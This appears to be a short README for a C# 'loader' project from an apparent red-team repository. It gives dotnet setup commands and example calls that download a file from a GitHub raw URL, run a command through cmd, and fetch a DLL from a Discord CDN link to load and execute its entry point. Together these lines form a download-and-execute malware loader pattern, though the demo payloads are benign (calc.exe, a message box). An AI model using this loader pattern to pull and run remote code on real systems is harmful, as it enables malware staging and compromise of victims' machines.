Project Setup
```
dotnet new console --output loader
dotnet run --project loader
```


Example tests for the loader main function:
```c#
string file = "test.json";
string fileLocation = "https://raw.githubusercontent.com/bakarilevy/TheKillchain/main/calculator.json";
GetFile(fileLocation, file);

string command = "/c calc.exe";
RunCommand(command);

string remoteDllUrl = "https://cdn.discordapp.com/attachments/804752207312322571/947621052064890890/example.dll";
string localDllName = "messagebox.dll";
string dllEntryName = "Test";
DllLoader(remoteDllUrl, localDllName, dllEntryName);
```